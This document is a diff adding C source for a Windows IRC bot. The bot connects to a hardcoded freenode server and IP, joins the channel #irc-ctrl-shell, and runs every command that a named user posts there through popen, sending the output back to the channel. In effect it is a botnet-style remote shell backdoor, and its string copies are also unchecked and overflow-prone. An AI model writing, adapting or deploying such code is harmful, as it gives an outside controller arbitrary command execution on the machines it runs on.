@@ -1,0 +1,144 @@
+/* holmes.freenode.net 83.170.73.249  6665 */
+
+/* privmsg #ubuntu-cn :im using telnet now! */
+
+/* PING :holmes.freenode.net */
+
+#include <stdio.h>
+#include <malloc.h>
+#include <string.h>
+#include <windows.h>
+#include <stdlib.h>
+#include <winsock.h>
+#pragma comment(lib,"ws2_32.lib")
+#include <pthread.h>
+#pragma comment(lib, "pthreadVC2.lib")
+
+    char *ping = "PING :holmes.freenode.net";
+    char *pong = "PONG :holmes.freenode.net\r\n";
+    char *keyword = "jusss PRIVMSG #irc-ctrl-shell :";
+    SOCKET sockfd;
+
+pthread_i()
+{
+    char recv_cmd[1080]={0};
+    char cmd[1024]={0};
+    char popen_out[1024]={0};
+    char popen_out_send[1080] = {0};
+    FILE *popen_fp;
+
+    while ( 1 ) {
+  	recv(sockfd,recv_cmd,1080,0);
+	printf("%s",recv_cmd); /* delete it */ 
+	
+	if (strstr(recv_cmd,ping)) send(sockfd,pong,strlen(pong),0); /* PING PONG */
+
+	/* execute command in shell */
+	if (strstr(recv_cmd,keyword)) {
+	    strcpy(cmd,((strstr(recv_cmd,keyword))+31));
+
+	    popen_fp = popen(cmd,"r");
+
+	    while ( fgets(popen_out,1024,popen_fp) != NULL) {
+	        strcat(popen_out_send,"privmsg #irc-ctrl-shell :");
+		strcat(popen_out_send,popen_out);
+		send(sockfd,popen_out_send,strlen(popen_out_send),0);
+		memset(popen_out,0,1024);
+		memset(popen_out_send,0,1080);
+		/*	    Sleep(1000);  irc server don't allow flood */
+	    }
+	    
+	    pclose(popen_fp);
+	    memset(cmd,0,1024);
+	}
+	memset(recv_cmd,0,1080);
+    }
+}
+
+pthread_ii()
+{
+    char recv_cmd[1080]={0};
+    char cmd[1024]={0};
+    char popen_out[1024]={0};
+    char popen_out_send[1080] = {0};
+    FILE *popen_fp;
+
+    while ( 1 ) {
+  	recv(sockfd,recv_cmd,1080,0);
+	printf("%s",recv_cmd); /* delete it */ 
+	
+	if (strstr(recv_cmd,ping)) send(sockfd,pong,strlen(pong),0); /* PING PONG */
+
+	/* execute command in shell */
+	if (strstr(recv_cmd,keyword)) {
+	    strcpy(cmd,((strstr(recv_cmd,keyword))+31));
+
+	    popen_fp = popen(cmd,"r");
+
+	    while ( fgets(popen_out,1024,popen_fp) != NULL) {
+	        strcat(popen_out_send,"privmsg #irc-ctrl-shell :");
+		strcat(popen_out_send,popen_out);
+		send(sockfd,popen_out_send,strlen(popen_out_send),0);
+		memset(popen_out,0,1024);
+		memset(popen_out_send,0,1080);
+		/*	    Sleep(1000);  irc server don't allow flood */
+	    }
+	    
+	    pclose(popen_fp);
+	    memset(cmd,0,1024);
+	}
+	memset(recv_cmd,0,1080);
+    }
+}
+
+int main()
+{
+    char *nick = "NICK bot9a\r\n";
+    char *user = "USER bot9a 8 * :bot9a\r\n";
+    char *channel = "join #irc-ctrl-shell\r\n";
+    char *recv_serv_profile;
+    int  recv_length = 0;
+    pthread_t pid_i,pid_ii;
+    struct sockaddr_in irc_addr;
+    irc_addr.sin_family=AF_INET;
+    irc_addr.sin_addr.s_addr=inet_addr("83.170.73.249");
+    irc_addr.sin_port=htons(6665);
+    WSADATA wsaData;
+
+    recv_serv_profile = malloc(1048576);
+    memset(recv_serv_profile,0,1048576);
+    WSAStartup(MAKEWORD(2,2),&wsaData);
+    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+
+    connect(sockfd,(struct sockaddr*)&irc_addr,sizeof(irc_addr));
+    send(sockfd,nick,strlen(nick),0);
+    send(sockfd,user,strlen(user),0);
+
+    /* fix this like test joined */
+    recv_length = recv(sockfd,recv_serv_profile,1048576,0);
+    if (recv_length > 0) printf("connecting...\r\n");
+    else printf("connect fail...\r\n");
+    printf("%s",recv_serv_profile); /* this line should be deleted */
+    send(sockfd,channel,strlen(channel),0);
+
+    /* test if it has joined the channel */
+    while ( 1 ) {
+      memset(recv_serv_profile,0,1048576);
+      recv(sockfd,recv_serv_profile,1048576,0);
+      printf("%s",recv_serv_profile); /* this line should be deleted */
+      if (strstr(recv_serv_profile,"#irc-ctrl-shell :End of /NAMES list.")) {
+	printf("already joined the channel\r\n");
+	break;
+      }
+    }
+
+    pthread_create(&pid_i,NULL,(void *)&pthread_i,NULL);
+    pthread_create(&pid_ii,NULL,(void *)&pthread_ii,NULL);
+    pthread_join(pid_i,NULL);
+    pthread_join(pid_ii,NULL);
+
+    closesocket(sockfd);
+    WSACleanup();
+    return 0;   
+
+}
